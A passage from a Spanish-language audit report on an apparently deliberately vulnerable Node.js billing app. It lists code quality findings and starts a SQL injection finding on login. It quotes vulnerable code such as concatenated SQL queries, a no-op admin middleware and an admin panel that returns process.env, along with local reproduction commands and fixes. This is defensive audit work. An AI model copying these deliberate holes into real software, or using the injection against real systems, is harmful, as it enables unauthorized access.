      return 'INACTIVE_CLIENT';
    }
  } else {
    return 'NO_CLIENT';
  }
}
```

**Árbol de decisión de `complexBillingDecision`:**

```
complexBillingDecision
├── [sin client]        → 'NO_CLIENT'
└── [con client]
    ├── [inactivo]      → 'INACTIVE_CLIENT'
    └── [activo]
        ├── [sin invoice]   → 'NO_INVOICE'
        └── [con invoice]
            ├── [amount ≤ 0]  → 'ZERO_AMOUNT'
            └── [amount > 0]
                ├── [sin config.billing] → 'NO_CONFIG'
                └── [con config.billing]
                    ├── [mode = 'lenient']  → 'ALLOW'
                    ├── [mode = otro]       → 'REVIEW'
                    └── [mode = 'strict']
                        ├── [no overdue]        → 'ALLOW'
                        └── [overdue]
                            ├── [creditScore ≥ 500] → 'WARN'
                            └── [creditScore < 500] → 'BLOCK'
```

### Evidencia — `sonarDebt.js`: función `calculateRiskLabel`

```javascript
export function calculateRiskLabel(score) {
  if (score !== null && score !== undefined) {
    if (typeof score === 'number') {
      if (score >= 0) {
        if (score < 20) {
          return 'VERY_HIGH_RISK';
        } else if (score < 40) {
          return 'HIGH_RISK';
        } else if (score < 60) {
          if (score % 2 === 0) {
            return 'MEDIUM_RISK_EVEN';
          } else {
            return 'MEDIUM_RISK_ODD';
          }
        } else if (score < 80) {
          return 'LOW_RISK';
        } else {
          return 'MINIMAL_RISK';
        }
      } else {
        return 'INVALID_NEGATIVE';
      }
    } else {
      return 'INVALID_TYPE';
    }
  } else {
    return 'NULL_SCORE';
  }
}
```

### Impacto Técnico

- Para probar exhaustivamente `complexBillingDecision` con cobertura de ramas al 100% se necesitan **al menos 10 casos de prueba distintos**.
- La probabilidad de introducir un bug al modificar estas funciones es significativamente mayor que en funciones simples.
- La legibilidad se ve gravemente comprometida; un nuevo desarrollador necesitará tiempo considerable para comprender el flujo.

### Impacto de Negocio

- Mayor costo y tiempo en mantenimiento y adición de nuevas reglas de negocio.
- Mayor riesgo de bugs en lógica crítica de facturación y evaluación de riesgo.
- Dificultad para onboarding de nuevos desarrolladores.

### Causa Raíz

Ausencia de refactorización y revisión de código. La lógica fue creciendo iterativamente sin aplicar patrones de diseño apropiados (Strategy, Decision Table, Guard Clauses).

### Solución Recomendada

Refactorizar utilizando **cláusulas de guarda** (early returns) y tablas de decisión:

```javascript
// Refactorización con guard clauses
function complexBillingDecision(client, invoice, config) {
  if (!client)              return 'NO_CLIENT';
  if (!client.active)       return 'INACTIVE_CLIENT';
  if (!invoice)             return 'NO_INVOICE';
  if (invoice.amount <= 0)  return 'ZERO_AMOUNT';
  if (!config?.billing)     return 'NO_CONFIG';

  const { mode } = config.billing;
  if (mode === 'lenient')   return 'ALLOW';
  if (mode !== 'strict')    return 'REVIEW';
  if (!invoice.overdue)     return 'ALLOW';

  return client.creditScore < 500 ? 'BLOCK' : 'WARN';
}
```

| Campo                       | Valor      |
|-----------------------------|------------|
| **Complejidad de Corrección** | Media    |
| **Prioridad**               | Alta       |
| **Esfuerzo estimado**       | 2–4 horas  |

---

## CAL-003: Código Muerto / Lógica Inalcanzable

| Campo                      | Detalle                                                      |
|----------------------------|--------------------------------------------------------------|
| **Identificador**          | CAL-003                                                      |
| **Nombre**                 | Código Muerto / Lógica Inalcanzable (Dead Code)              |
| **Categoría**              | Calidad de Código — Mantenibilidad / Seguridad               |
| **Tipo**                   | Code Smell + Potencial Security Smell                        |
| **Severidad**              | 🟡 Media                                                     |
| **Herramienta detectora**  | SonarQube (regla: `javascript:S2583`) + Manual               |
| **CWE**                    | CWE-570: Expression is Always False / CWE-561: Dead Code     |

### Descripción Técnica

Se identificaron dos instancias de código muerto o lógica inalcanzable. En la primera, una condición lógicamente contradictoria impide que el bloque sea ejecutado jamás. En la segunda, un middleware de autorización existe en el código pero no realiza ningún control efectivo, dando una falsa sensación de seguridad.

### Evidencia 1 — `frontend/src/utils/sonarDebt.js`: función `unreachableBranch`

```javascript
export function unreachableBranch(value) {
  // CÓDIGO MUERTO: esta condición NUNCA puede ser verdadera.
  // value === 'admin' AND value !== 'admin' es una contradicción lógica.
  if (value === 'admin' && value !== 'admin') {
    // Este bloque JAMÁS se ejecutará, pero expone una constante sensible
    return FRONTEND_API_SECRET;
  }
  
  if (value === 'superadmin') {
    return 'SUPER';
  }
  return 'USER';
}
```

**Análisis:** La condición `value === 'admin' && value !== 'admin'` es una **contradicción lógica** — ambas condiciones no pueden ser verdaderas simultáneamente para ningún valor de `value`. SonarQube la clasifica como `always false`. El código dentro del bloque es inalcanzable. Sin embargo, la referencia a `FRONTEND_API_SECRET` en código muerto indica que probablemente fue código real en algún momento y no fue eliminado adecuadamente.

### Evidencia 2 — `backend/src/middleware/auth.js`: función `frontendOnlyAdminHint`

```javascript
// Middleware que APARENTA ser una verificación de admin
// pero en realidad no hace ningún control
function frontendOnlyAdminHint(req, res, next) {
  // No hay ninguna verificación real aquí
  // El nombre sugiere que la "protección" es solo en el frontend
  next(); // Siempre pasa al siguiente middleware
}
```

**Análisis:** El nombre `frontendOnlyAdminHint` es revelador: la "autenticación" de admin solo existe en el frontend (UI), no en el servidor. Este middleware no verifica el rol del token, no valida credenciales, no comprueba permisos. Es **código de seguridad inexistente** con apariencia de funcionalidad.

### Impacto Técnico

- La contradicción lógica en `unreachableBranch` genera confusión sobre el comportamiento intencionado.
- Si `FRONTEND_API_SECRET` alguna vez fue retornado por este path, podría exponer secretos.
- `frontendOnlyAdminHint` da una falsa sensación de seguridad: los desarrolladores podrían creer que los endpoints de admin están protegidos cuando no lo están.

### Impacto de Negocio

- El control de acceso administrativo depende **únicamente del frontend**, lo que significa que cualquier petición directa al backend evita por completo las restricciones.
- Riesgo elevado de acceso no autorizado a funciones administrativas (ver SEC-006).

### Causa Raíz

- En `unreachableBranch`: error de programación al escribir la condición (probablemente intentaba `value === 'admin' || value !== 'admin'`), o código de prueba que nunca fue eliminado.
- En `frontendOnlyAdminHint`: decisión arquitectónica errónea de delegar el control de acceso al cliente, violando el principio de **Never Trust The Client**.

### Solución Recomendada

1. **`unreachableBranch`:** Eliminar el bloque inalcanzable y la referencia a `FRONTEND_API_SECRET`. Si la constante contiene un secreto real, rotar su valor inmediatamente.
2. **`frontendOnlyAdminHint`:** Implementar una verificación real de rol en el middleware del servidor:

```javascript
function requireAdmin(req, res, next) {
  const token = req.headers.authorization;
  if (!token) return res.status(401).json({ error: 'No autorizado' });
  
  // Verificar token y rol (ver SEC-003 para implementación correcta)
  const decoded = verifyToken(token);
  if (!decoded || decoded.role !== 'admin') {
    return res.status(403).json({ error: 'Acceso denegado' });
  }
  next();
}
```

| Campo                       | Valor        |
|-----------------------------|--------------|
| **Complejidad de Corrección** | Baja–Media |
| **Prioridad**               | Alta         |
| **Esfuerzo estimado**       | 1–2 horas    |

---

## CAL-004: Errores Silenciados (Swallowed Exceptions)

| Campo                      | Detalle                                                      |
|----------------------------|--------------------------------------------------------------|
| **Identificador**          | CAL-004                                                      |
| **Nombre**                 | Errores Silenciados — Swallowed Exceptions                   |
| **Categoría**              | Calidad de Código — Confiabilidad / Observabilidad           |
| **Tipo**                   | Bug de Confiabilidad                                         |
| **Severidad**              | 🟠 Alta                                                      |
| **Herramienta detectora**  | SonarQube (regla: `javascript:S2737`) + Manual               |
| **CWE**                    | CWE-390: Detection of Error Condition Without Action         |

### Descripción Técnica

Se identificaron múltiples bloques `catch` vacíos o que no realizan ninguna acción útil al capturar una excepción. Esta práctica, conocida como **"swallowing exceptions"**, es considerada un bug de confiabilidad grave: cuando ocurre un error, éste es capturado y descartado silenciosamente, dejando al sistema en un estado potencialmente inconsistente sin que ningún log, alerta o respuesta de error sea generada.

### Evidencia 1 — `backend/src/controllers/legacyDebtController.js`: función `swallowedErrors`

```javascript
function swallowedErrors(input) {
  try {
    // Operación que puede lanzar excepciones
    const parsed = JSON.parse(input);
    const result = parsed.data.value.nested.deep; // puede fallar con TypeError
    return processResult(result);
  } catch (e) {
    // ERROR SILENCIADO: catch completamente vacío
    // Si JSON.parse falla, si parsed.data es undefined, si cualquier
    // cosa lanza una excepción → se descarta silenciosamente
    // La función retorna 'undefined' sin indicación de error
  }
}
```

**Consecuencias directas:**
- `swallowedErrors` retorna `undefined` en caso de error sin indicarlo
- El código que llama a esta función recibe `undefined` inesperadamente
- No hay ningún registro del error en logs para diagnóstico posterior

### Evidencia 2 — `frontend/src/utils/sonarDebt.js`: función `fragileParser`

```javascript
export function fragileParser(jsonString) {
  try {
    const obj = JSON.parse(jsonString);
    return obj.result.value; // TypeError si result o value son undefined
  } catch (e) {
    // CATCH VACÍO: el error de parsing o acceso a propiedad
    // es completamente ignorado
  }
  // retorna undefined implícitamente
}
```

**Consecuencias en el frontend:**
- Los componentes que consumen `fragileParser` reciben `undefined` sin saberlo
- Esto puede causar errores en cascada en el renderizado de React (TypeError al intentar acceder propiedades de `undefined`)
- Imposibilidad de diagnosticar problemas en producción

### Reproducibilidad

```javascript
// Llamada que silenciosamente falla:
const result = swallowedErrors('{"invalid": json}');
console.log(result); // undefined — sin ninguna indicación de error

const parsed = fragileParser('not-json-at-all');
console.log(parsed); // undefined — error completamente ignorado
```

### Impacto Técnico

- **Errores ocultos:** Fallos silenciosos que pueden corromper el estado de la aplicación.
- **Diagnóstico imposible:** Sin logs ni mensajes de error, es imposible determinar qué salió mal en producción.
- **Comportamiento indefinido:** Código que recibe `undefined` donde esperaba un objeto puede fallar de formas inesperadas más adelante (error a distancia).
- **Testing ineficaz:** Los tests que no verifican casos de error pasan satisfactoriamente aunque el código sea incorrecto.

### Impacto de Negocio

- Dificultad extrema para diagnosticar y resolver incidencias en producción.
- Mayor tiempo de resolución de bugs (MTTR elevado).
- Potencial corrupción de datos si `undefined` se propaga a escrituras en base de datos.

### Causa Raíz

Prácticas de programación defensiva mal aplicadas. Los desarrolladores agregaron bloques `try-catch` para evitar que la aplicación se caiga, pero no implementaron ningún mecanismo de manejo de errores dentro del `catch`.

### Solución Recomendada

```javascript
// Corrección: manejo explícito de errores
function swallowedErrors(input) {
  try {
    const parsed = JSON.parse(input);
    const result = parsed?.data?.value?.nested?.deep; // optional chaining
    if (result === undefined) {
      throw new Error('Estructura de datos inesperada en input');
    }
    return processResult(result);
  } catch (e) {
    // SIEMPRE registrar el error
    console.error('[swallowedErrors] Error al procesar input:', e.message);
    // Retornar un valor sentinel o relanzar según el contexto
    return null; // o throw e; según necesidad del llamador
  }
}
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Baja    |
| **Prioridad**               | Alta      |
| **Esfuerzo estimado**       | 1–2 horas |

---

## CAL-005: Promesas sin Manejo de Errores

| Campo                      | Detalle                                                        |
|----------------------------|----------------------------------------------------------------|
| **Identificador**          | CAL-005                                                        |
| **Nombre**                 | Promesas sin Manejo de Errores — Unhandled Promise Rejection   |
| **Categoría**              | Calidad de Código — Confiabilidad / Estabilidad del Servidor   |
| **Tipo**                   | Bug Crítico de Confiabilidad                                   |
| **Severidad**              | 🟠 Alta                                                        |
| **Herramienta detectora**  | SonarQube (regla: `javascript:S4822`) + Manual                 |
| **CWE**                    | CWE-391: Unchecked Error Condition                             |

### Descripción Técnica

Se identificó código en el backend que crea promesas rechazadas (`Promise.reject`) sin ningún manejador `.catch()`, y un `setTimeout` que lanza una excepción dentro de su callback, lo que provoca un `UnhandledPromiseRejection` y puede **derribar el proceso Node.js completo** dependiendo de la versión de Node y su configuración de manejo de errores.

### Evidencia — `backend/src/controllers/legacyDebtController.js`: función `ignoredPromise`

```javascript
function ignoredPromise(req, res) {
  // CASO 1: Promise.reject sin .catch()
  // En Node.js moderno (v15+), esto termina el proceso con código de salida 1
  Promise.reject(new Error('Este error de promesa nunca se maneja'));
  
  // CASO 2: setTimeout con excepción no capturada
  // Una excepción lanzada dentro de setTimeout no puede ser capturada
  // por try-catch externo — va directamente al event loop como
  // UnhandledRejection / UncaughtException
  setTimeout(() => {
    throw new Error('Excepción en setTimeout que crashea Node.js');
  }, 1);
  
  // El código continúa ejecutándose aquí aparentemente normal...
  res.json({ status: 'procesando' });
  // ...pero 1ms después el servidor puede caer
}
```

**Flujo del error:**

```
ignoredPromise() llamado
    ↓
Promise.reject(...) creado → sin .catch() → UnhandledPromiseRejection
    ↓
setTimeout callback → throw Error → UncaughtException
    ↓
Node.js (v15+): proceso termina con exit code 1
    ↓
Servidor Express completamente caído
    ↓
Todos los usuarios pierden servicio (DoS accidental)
```

### Reproducibilidad

Cualquier petición que active la función `ignoredPromise` tiene el potencial de derribar el proceso Node.js. En versiones de Node.js 15 y superiores, un `UnhandledPromiseRejection` termina el proceso por defecto.

```bash
# Demostración del comportamiento:
node -e "Promise.reject(new Error('unhandled')); setTimeout(() => {}, 5000);"
# Node v15+: proceso termina inmediatamente con:
# UnhandledPromiseRejection: Error: unhandled
```

### Impacto Técnico

- **Denegación de Servicio (DoS) accidental:** Una sola petición al endpoint que activa esta función puede derribar el servidor para todos los usuarios.
- **Pérdida de datos en vuelo:** Todas las solicitudes en curso se pierden abruptamente.
- **Difícil diagnóstico:** Si el proceso no tiene un `uncaughtException` handler, puede no generar logs antes de terminar.

### Impacto de Negocio

- Interrupción total del servicio para todos los usuarios.
- Potencial pérdida de transacciones en proceso.
- En un contexto de producción, un actor malicioso podría explotar esto deliberadamente como vector de DoS.

### Causa Raíz

Falta de comprensión del modelo de concurrencia asíncrona de Node.js y del ciclo de vida de las Promesas. Los errores dentro de `setTimeout` y las promesas rechazadas sin manejadores no son capturados por `try-catch` convencionales.

### Solución Recomendada

```javascript
// Corrección completa
async function ignoredPromise(req, res) {
  try {
    // Siempre await las promesas para capturar sus rechazos
    await Promise.resolve().then(() => {
      // lógica asíncrona aquí
    });
    
    // Nunca lanzar excepciones dentro de setTimeout
    // Usar async/await en su lugar
    await new Promise((resolve, reject) => {
      setTimeout(() => {
        try {
          // lógica que podría fallar
          resolve();
        } catch (e) {
          reject(e);
        }
      }, 1);
    });
    
    res.json({ status: 'completado' });
  } catch (err) {
    console.error('[ignoredPromise] Error capturado:', err.message);
    res.status(500).json({ error: 'Error interno del servidor' });
  }
}

// A nivel de aplicación (app.js): registrar manejador global como safety net
process.on('unhandledRejection', (reason, promise) => {
  console.error('UnhandledRejection en:', promise, 'reason:', reason);
  // Nunca terminar el proceso aquí — solo registrar
});
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Media   |
| **Prioridad**               | Alta      |
| **Esfuerzo estimado**       | 2–3 horas |

---

## CAL-006: Desreferenciación de Nulo (Null Dereference)

| Campo                      | Detalle                                                        |
|----------------------------|----------------------------------------------------------------|
| **Identificador**          | CAL-006                                                        |
| **Nombre**                 | Desreferenciación de Nulo — Null Pointer Dereference           |
| **Categoría**              | Calidad de Código — Confiabilidad                              |
| **Tipo**                   | Bug                                                            |
| **Severidad**              | 🟠 Alta                                                        |
| **Herramienta detectora**  | SonarQube (regla: `javascript:S2259`) + Manual                 |
| **CWE**                    | CWE-476: NULL Pointer Dereference                              |

### Descripción Técnica

Se identificó una desreferenciación de objeto potencialmente nulo que puede generar un `TypeError` no controlado en el backend. Cuando el parámetro `?crash=true` es enviado en la petición, la función `nullDereference` intenta acceder a la propiedad `profile.name` de un objeto `user` que puede ser `null`, provocando un error que no es capturado y se propaga como respuesta de error 500 con stack trace expuesto.

### Evidencia — `backend/src/controllers/legacyDebtController.js`: función `nullDereference`

```javascript
function nullDereference(req, res) {
  const shouldCrash = req.query.crash === 'true';
  
  // user será null cuando shouldCrash es true
  const user = shouldCrash ? null : { profile: { name: 'Test User' } };
  
  // DESREFERENCIACIÓN: si user es null, user.profile lanza:
  // TypeError: Cannot read properties of null (reading 'profile')
  const name = user.profile.name;
  //           ^^^^         ← TypeError si user === null
  //                 ^^^^^ ← TypeError si profile === undefined
  
  res.json({ name });
}
```

**Traza de error generada:**

```
TypeError: Cannot read properties of null (reading 'profile')
    at nullDereference (legacyDebtController.js:XX)
    at Layer.handle [as handle_request] (express/lib/router/layer.js:95)
    at next (express/lib/router/route.js:137)
    ...
```

### Reproducibilidad

```bash
# Trigger del bug:
curl "http://localhost:4000/api/legacy/decision?crash=true"

# Respuesta (si el error handler expone stack traces — ver SEC-021):
# {
#   "error": "Cannot read properties of null (reading 'profile')",
#   "stack": "TypeError: Cannot read properties of null...",
#   "raw": { ... }
# }
```

### Impacto Técnico

- El servidor responde con un error 500 interno que puede exponer el stack trace al cliente (combinado con SEC-021).
- Revela la estructura interna del código (nombres de archivos, líneas, módulos).
- Si el error no es manejado por ningún middleware de error global, puede en casos extremos desestabilizar el proceso.

### Impacto de Negocio

- Exposición de información de implementación interna a potenciales atacantes.
- Posible vector de enumeración de la estructura del código fuente.

### Causa Raíz

Falta de validación de valores antes de acceder a sus propiedades. El desarrollador no contempló que `user` podría ser `null` antes de acceder a `user.profile`.

### Solución Recomendada

```javascript
function nullDereference(req, res) {
  const shouldCrash = req.query.crash === 'true';
  const user = shouldCrash ? null : { profile: { name: 'Test User' } };
  
  // Opción 1: Optional chaining (ES2020+)
  const name = user?.profile?.name ?? 'Usuario desconocido';
  
  // Opción 2: Validación explícita
  if (!user || !user.profile) {
    return res.status(400).json({ error: 'Usuario no disponible' });
  }
  
  res.json({ name: user.profile.name });
}
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Baja    |
| **Prioridad**               | Alta      |
| **Esfuerzo estimado**       | < 1 hora  |

---

## CAL-007: Falta de Cohesión de Módulos (Violación del SRP)

| Campo                      | Detalle                                                         |
|----------------------------|-----------------------------------------------------------------|
| **Identificador**          | CAL-007                                                         |
| **Nombre**                 | Falta de Cohesión — Violación del Principio de Responsabilidad Única |
| **Categoría**              | Calidad de Código — Diseño / Arquitectura                       |
| **Tipo**                   | Code Smell (Diseño)                                             |
| **Severidad**              | 🟡 Media                                                        |
| **Herramienta detectora**  | SonarQube (métricas de cohesión) + Revisión Manual             |
| **CWE**                    | CWE-1120: Excessive Code Complexity (relacionado con diseño)    |

### Descripción Técnica

El archivo `backend/src/controllers/legacyDebtController.js` viola el **Principio de Responsabilidad Única (SRP)** de forma flagrante. Un solo módulo agrupa funcionalidades completamente heterogéneas y no relacionadas entre sí, lo que resulta en un módulo imposible de mantener, testear y entender de forma independiente.

### Evidencia — Responsabilidades encontradas en `legacyDebtController.js`

| Función / Bloque                  | Responsabilidad                          |
|-----------------------------------|------------------------------------------|
| `complexBillingDecision`          | Lógica de negocio: decisión de facturación |
| `duplicatedExportA/B`             | Exportación de datos a CSV               |
| `swallowedErrors`                 | Parsing de JSON (con errores silenciados)|
| `ignoredPromise`                  | Manejo asíncrono (mal implementado)      |
| `nullDereference`                 | Acceso a datos de usuario                |
| `weakCryptoDemo`                  | Criptografía: MD5, Math.random           |
| `regexBomb`                       | Validación de entradas con regex         |
| Constantes hardcodeadas           | Credenciales AWS, private keys, etc.     |

**Diagnóstico SonarQube:** El módulo tiene más de **200 líneas**, más de **15 funciones**, abarca **7 responsabilidades distintas** y tiene dependencias con `crypto`, `child_process`, `fs`, el módulo de base de datos, y constantes de configuración.

### Impacto Técnico

- Imposible aislar y testear unitariamente cada responsabilidad.
- Cambios en la lógica de facturación pueden afectar accidentalmente la lógica de criptografía.
- Alto acoplamiento entre responsabilidades no relacionadas.
- Dificultad extrema para la revisión de código (code review) efectiva.

### Impacto de Negocio

- Costo elevado de mantenimiento y evolución del módulo.
- Mayor probabilidad de regresiones al realizar cambios.

### Causa Raíz

Ausencia de guías de diseño y arquitectura en el equipo. El módulo fue creciendo orgánicamente sin planificación, acumulando código nuevo sin refactorización.

### Solución Recomendada

Dividir `legacyDebtController.js` en módulos especializados:

```
controllers/
├── billingController.js      # complexBillingDecision y lógica de negocio
├── exportController.js       # exportToCSV (función unificada)
├── cryptoController.js       # demos de criptografía
├── validationController.js   # lógica de regex y validaciones
└── legacyDebtController.js   # solo lo específico de deuda legacy
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Media   |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | 4–8 horas |

---

## CAL-008: Uso de `var` en lugar de `let`/`const`

| Campo                      | Detalle                                                         |
|----------------------------|-----------------------------------------------------------------|
| **Identificador**          | CAL-008                                                         |
| **Nombre**                 | Uso de `var` — Declaraciones con Alcance Incorrecto             |
| **Categoría**              | Calidad de Código — Mantenibilidad                              |
| **Tipo**                   | Code Smell                                                      |
| **Severidad**              | 🟢 Baja                                                         |
| **Herramienta detectora**  | SonarQube (regla: `javascript:S3504`) + ESLint (`no-var`)       |
| **CWE**                    | CWE-1164: Irrelevant Code (relacionado con buenas prácticas)    |

### Descripción Técnica

Se identificaron múltiples usos de `var` para declaración de variables en el código fuente. La palabra reservada `var` en JavaScript tiene **alcance de función** (no de bloque) y es **hoisted** al inicio de la función, lo que puede generar comportamientos inesperados. Desde ES6 (2015), las buenas prácticas establecen usar `const` para valores que no cambian y `let` para valores que se reasignan.

### Evidencia

```javascript
// Patrones encontrados en múltiples archivos:

// legacyDebtController.js
var result = '';
var i = 0;
for (var i = 0; i < data.length; i++) { // 'i' sobreescribe el var anterior
  var result = processItem(data[i]);    // var result tiene scope de función
}
// Aquí 'i' vale data.length (no está dentro del for)
// y 'result' es el último valor procesado

// sonarDebt.js
var apiKey = process.env.API_KEY;
var tempValue = calculateTemp();
```

**El problema del hoisting con `var`:**

```javascript
// Comportamiento inesperado con var en bucles:
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// Imprime: 3, 3, 3 (en lugar de 0, 1, 2)
// Con let: imprimiría 0, 1, 2 correctamente
```

### Solución Recomendada

Reemplazar sistemáticamente `var` por `const` o `let`:

```javascript
// Correcto:
const apiKey = process.env.API_KEY; // no se reasigna → const
let result = '';                     // se reasigna → let

for (let i = 0; i < data.length; i++) { // scope de bloque → let
  result = processItem(data[i]);
}
```

Configurar ESLint con la regla `"no-var": "error"` para prevenir nuevas ocurrencias.

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Baja      |
| **Esfuerzo estimado**       | < 1 hora (con ESLint --fix) |

---

## CAL-009: Callback Hell (Anidamiento Profundo de Callbacks)

| Campo                      | Detalle                                                       |
|----------------------------|---------------------------------------------------------------|
| **Identificador**          | CAL-009                                                       |
| **Nombre**                 | Callback Hell — Pirámide de la Perdición                      |
| **Categoría**              | Calidad de Código — Mantenibilidad / Legibilidad              |
| **Tipo**                   | Code Smell                                                    |
| **Severidad**              | 🟡 Media                                                      |
| **Herramienta detectora**  | SonarQube (regla: `javascript:S1067`) + Revisión Manual       |
| **CWE**                    | CWE-1120: Excessive Code Complexity                           |

### Descripción Técnica

Se identificó un patrón de **callback hell** en `adminController.js`, donde múltiples consultas a la base de datos SQLite son anidadas en cascada usando callbacks en lugar de utilizar Promesas o `async/await`. Este patrón resulta en código difícil de leer, mantener y depurar, con manejo de errores fragmentado y duplicado en cada nivel.

### Evidencia — `backend/src/controllers/adminController.js`: función `panel`

```javascript
// Función panel con 3 niveles de callbacks anidados
function panel(req, res) {
  // Nivel 1: primera consulta a BD
  db.all('SELECT * FROM users', [], (err1, users) => {
    if (err1) {
      return res.status(500).json({ error: err1.message });
    }
    
    // Nivel 2: segunda consulta dependiente del resultado anterior
    db.all('SELECT * FROM clients', [], (err2, clients) => {
      if (err2) {
        return res.status(500).json({ error: err2.message });
      }
      
      // Nivel 3: tercera consulta anidada
      db.all('SELECT * FROM invoices', [], (err3, invoices) => {
        if (err3) {
          return res.status(500).json({ error: err3.message });
        }
        
        // Solo aquí podemos construir la respuesta
        res.json({
          users,
          clients,
          invoices,
          config: process.env // también expone variables de entorno
        });
      });
      // Cierre nivel 3
    });
    // Cierre nivel 2
  });
  // Cierre nivel 1
}
```

### Impacto Técnico

- Código con forma de "pirámide" que crece horizontalmente con cada nueva consulta.
- Manejo de errores duplicado en cada nivel (3 bloques `if (err)` idénticos).
- Imposible ejecutar las consultas en paralelo aunque no tengan dependencias entre sí.
- Las consultas se ejecutan **secuencialmente** cuando podrían ejecutarse en paralelo, triplicando el tiempo de respuesta.

### Impacto de Negocio

- Mayor latencia en el endpoint `/api/admin/panel` sin razón técnica.
- Mayor costo de mantenimiento al agregar nuevas consultas.

### Solución Recomendada

Refactorizar con `async/await` y `Promise.all` para paralelismo:

```javascript
async function panel(req, res) {
  try {
    // Ejecutar las 3 consultas EN PARALELO (3x más rápido)
    const [users, clients, invoices] = await Promise.all([
      dbQuery('SELECT id, username, role FROM users'), // sin passwords
      dbQuery('SELECT * FROM clients'),
      dbQuery('SELECT * FROM invoices')
    ]);
    
    res.json({ users, clients, invoices });
  } catch (err) {
    console.error('[panel] Error de base de datos:', err.message);
    res.status(500).json({ error: 'Error al obtener datos del panel' });
  }
}

// Helper para promisificar las consultas de SQLite
function dbQuery(sql, params = []) {
  return new Promise((resolve, reject) => {
    db.all(sql, params, (err, rows) => {
      if (err) reject(err);
      else resolve(rows);
    });
  });
}
```

| Campo                       | Valor      |
|-----------------------------|------------|
| **Complejidad de Corrección** | Baja     |
| **Prioridad**               | Media      |
| **Esfuerzo estimado**       | 1–2 horas  |

---

## CAL-010: SQL Construido por Concatenación de Strings

| Campo                      | Detalle                                                            |
|----------------------------|--------------------------------------------------------------------|
| **Identificador**          | CAL-010                                                            |
| **Nombre**                 | SQL Construido por Concatenación — Code Smell de Mantenibilidad y Seguridad |
| **Categoría**              | Calidad de Código / Seguridad — Crítico                            |
| **Tipo**                   | Code Smell + Vulnerabilidad de Seguridad                          |
| **Severidad**              | 🟠 Alta (calidad) / 🔴 Crítica (seguridad — ver SEC-001/002)      |
| **Herramienta detectora**  | SonarQube (regla: `javascript:S2077`) + Manual                    |
| **CWE**                    | CWE-89: Improper Neutralization of Special Elements in SQL Command |

### Descripción Técnica

La **totalidad** de las consultas SQL en el backend son construidas mediante concatenación directa de strings con valores de entrada del usuario. Esta práctica es la causa raíz directa de las vulnerabilidades de **Inyección SQL** documentadas en SEC-001 y SEC-002. Además de ser una vulnerabilidad crítica de seguridad, desde el punto de vista de calidad es un code smell grave que dificulta la lectura, el mantenimiento y el análisis estático de las consultas.

### Evidencia — Múltiples controladores

**`authController.js`:**
```javascript
// Línea 9 — Login con concatenación directa de username
const sql = "SELECT * FROM users WHERE username = '" + username + "'";
db.get(sql, (err, user) => { ... });
```

**`clientController.js`:**
```javascript
// Búsqueda de clientes — completamente vulnerable a SQLi UNION
const sql = "SELECT * FROM clients WHERE name LIKE '%" + q + "%'";

// Obtención por ID
const sql2 = "SELECT * FROM clients WHERE id = " + req.params.id;
```

**`invoiceController.js`:**
```javascript
// Búsqueda de facturas
const sql = "SELECT * FROM invoices WHERE client_id = " + clientId 
          + " AND status = '" + status + "'";
```

**`uploadController.js`:**
```javascript
// Inserción de metadatos de archivo
const sql = "INSERT INTO uploads (filename, path, user_id) VALUES ('" 
          + filename + "', '" + filePath + "', " + userId + ")";
```

### Impacto Técnico

Ver SEC-001 y SEC-002 para el impacto completo de seguridad. Desde el punto de vista de calidad:
- Las consultas son difíciles de leer y auditar.
- SonarQube marca cada instancia como vulnerabilidad de seguridad (Blocker).
- Imposibilidad de usar herramientas de análisis de queries para optimización.

### Solución Recomendada

Reemplazar **todas** las concatenaciones por **consultas parametrizadas** (prepared statements):

```javascript
// ❌ Vulnerable (actual):
const sql = "SELECT * FROM users WHERE username = '" + username + "'";
db.get(sql, callback);

// ✅ Correcto (parametrizado):
const sql = "SELECT * FROM users WHERE username = ?";
db.get(sql, [username], callback);

// ✅ Con múltiples parámetros:
const sql = "SELECT * FROM clients WHERE name LIKE ? AND active = ?";
db.all(sql, [`%${q}%`, 1], callback);

// ✅ Para INSERT:
const sql = "INSERT INTO uploads (filename, path, user_id) VALUES (?, ?, ?)";
db.run(sql, [filename, filePath, userId], callback);
```

SQLite3 soporta nativamente consultas parametrizadas. El driver de Node.js acepta el segundo argumento como array de parámetros que son escapados automáticamente.

| Campo                       | Valor          |
|-----------------------------|----------------|
| **Complejidad de Corrección** | Media        |
| **Prioridad**               | Crítica        |
| **Esfuerzo estimado**       | 4–6 horas      |

---

---

# 5. HALLAZGOS DE SEGURIDAD

> Los hallazgos de esta sección fueron detectados mediante análisis estático (SonarQube), análisis dinámico (OWASP ZAP), pruebas manuales y revisión de código. Cada hallazgo ha sido reproducido manualmente para confirmar su explotabilidad. Se clasifican según **OWASP Top 10 2021**.

---

## SEC-001: Inyección SQL — Endpoint de Login

| Campo                      | Detalle                                                         |
|----------------------------|-----------------------------------------------------------------|
| **Identificador**          | SEC-001                                                         |
| **Nombre**                 | Inyección SQL en Autenticación (Login Bypass)                   |
| **Categoría OWASP**        | A03:2021 – Injection                                            |
| **Tipo**                   | SQL Injection — In-band (Error-based / Boolean-based)           |
| **Severidad**              | 🔴 Crítica                                                      |
| **CVSS v3.1**              | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)                      |
| **Herramienta detectora**  | SonarQube + OWASP ZAP + Revisión Manual                         |
| **CWE**                    | CWE-89: Improper Neutralization of Special Elements in SQL      |

### Descripción Técnica

El endpoint `POST /api/auth/login` construye la consulta SQL de autenticación mediante concatenación directa de la entrada del usuario en la cadena SQL, sin ningún tipo de sanitización, escape o parametrización. Esto permite a un atacante inyectar código SQL arbitrario en la consulta, pudiendo autenticarse como cualquier usuario sin conocer su contraseña (incluyendo el administrador).

### Evidencia — `backend/src/controllers/authController.js`, línea 9

```javascript
router.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // VULNERABILIDAD CRÍTICA: concatenación directa del input del usuario
  const sql = "SELECT * FROM users WHERE username = '" + username + "'";
  //                                                    ^^^^^^^^^^^
  //                                    Input no sanitizado directamente en SQL
  
